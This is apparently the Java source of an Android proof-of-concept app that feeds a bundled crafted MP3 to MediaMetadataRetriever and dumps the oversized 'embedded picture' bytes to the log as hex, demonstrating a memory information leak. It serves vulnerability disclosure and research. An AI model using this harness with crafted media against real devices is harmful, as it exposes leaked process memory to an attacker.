package ar.org.sadosky.mp3infoleak;


import android.support.v7.app.ActionBarActivity;
import android.content.res.AssetFileDescriptor;
import android.media.MediaMetadataRetriever;
import android.os.Bundle;
import android.util.Log;
import ar.org.sadosky.mp3infoleak.R;

public class MainActivity extends ActionBarActivity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		byte[] art = null;

				try {
				MediaMetadataRetriever metaRetriver = new MediaMetadataRetriever();
				AssetFileDescriptor afd = getAssets().openFd("new_bug.mp3");
				metaRetriver.setDataSource(afd.getFileDescriptor(),afd.getStartOffset(),afd.getLength());
				art = metaRetriver.getEmbeddedPicture();
				if(art.length > 10000){
					Log.d("INFOLEAK", "Infoleak was succesful");
				}
				String dump = bytesToHex(art).replaceAll("(.{8})(?!$)", "$1-");
			    int chunkCount = dump.length() / 4000;    
			    for (int i = 0; i <= chunkCount; i++) {
			        int max = 4000 * (i + 1);
			        if (max >= dump.length()) {
			            Log.v("INFOLEAK", dump.substring(4000 * i));
			        } else {
			            Log.v("INFOLEAK", dump.substring(4000 * i, max));
			        }
			    }
			    this.finish();
			} catch (Exception e) {
				Log.d("INFOLEAK", "Infoleak was unsuccesful");
				}
	}

	final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
	public static String bytesToHex(byte[] bytes) {
	    char[] hexChars = new char[bytes.length * 2];
	    for ( int j = 0; j < bytes.length; j++ ) {
	        int v = bytes[j] & 0xFF;
	        hexChars[j * 2] = hexArray[v >>> 4];
	        hexChars[j * 2 + 1] = hexArray[v & 0x0F];
	    }
	    return new String(hexChars);
	}

}
